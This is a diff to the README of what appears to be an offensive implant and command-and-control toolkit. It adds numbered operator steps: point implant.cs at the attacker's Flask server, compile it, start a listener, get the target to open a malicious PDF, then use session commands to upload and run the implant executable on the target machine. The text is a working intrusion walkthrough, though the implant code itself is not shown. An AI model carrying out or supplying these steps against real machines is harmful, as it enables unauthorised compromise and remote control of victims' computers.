@@ -50,21 +50,27 @@ Follow the following videos in order
 2. Start flask server that is responsible for communicating with implants
           
           Make note of the IP and port that the flask server is running on so that the implants know where to communicate back to 
+          
+          Make changes to the 'srvip' variable in implant.cs with the srvip that the flask server uses
 
-3. Start listener by running the listener.sh script
+3. Build the implant.cs into an executable
+          
+          mcs implant.cs
+
+4. Start listener by running the listener.sh script
   
           chmod +x listener.sh
           
           ./listener.sh
 
-4. Download and open the malicious PDF on the target machine
+5. Download and open the malicious PDF on the target machine
 
-5. Upload the upload_exe.rc file to the target machine via session
+6. Upload the upload_exe.rc file to the target machine via session
   
           sessions -i 1
   
           upload upload_exe.rc
   
-6. Run the resource script in order to upload and run the executable
+7. Run the resource script in order to upload and run the executable
   
           resource upload_exe.rc
